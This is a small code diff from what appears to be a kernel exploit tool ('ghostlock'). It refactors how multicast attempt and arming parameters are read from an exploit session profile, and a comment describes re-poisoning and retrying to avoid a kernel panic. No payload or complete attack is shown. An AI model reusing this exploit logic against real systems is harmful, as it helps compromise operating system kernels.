@@ -90,14 +90,13 @@ namespace ghostlock::route {
          * costs the whole run, because a miss usually panics the kernel.
          * Re-poison and re-walk instead, arming from the point where the earlier
          * copies have overwritten each other. */
-        const profile::execution_settings *exec =
-                session::g_exploit_session.profile.execution();
+        const profile::McastTuning mcast =
+                session::g_exploit_session.profile.mcast_tuning();
         const int32_t max_attempts =
-                mcast_from_profile(exec ? exec->mcast_attempts : 0, kMulticastMaxAttempts);
+                mcast_from_profile(mcast.attempts, kMulticastMaxAttempts);
         const int32_t arm_sequence =
-                mcast_from_profile(exec ? exec->mcast_arm_sequence : 0, kMulticastArmSequence);
-        const int32_t arm_hold =
-                mcast_from_profile(exec ? exec->mcast_arm_hold : 0, kMulticastArmHold);
+                mcast_from_profile(mcast.arm_sequence, kMulticastArmSequence);
+        const int32_t arm_hold = mcast_from_profile(mcast.arm_hold, kMulticastArmHold);
         int32_t stamp_result = -1;
         int32_t stamp_errno = 0;
         int32_t attempts_used = 0;
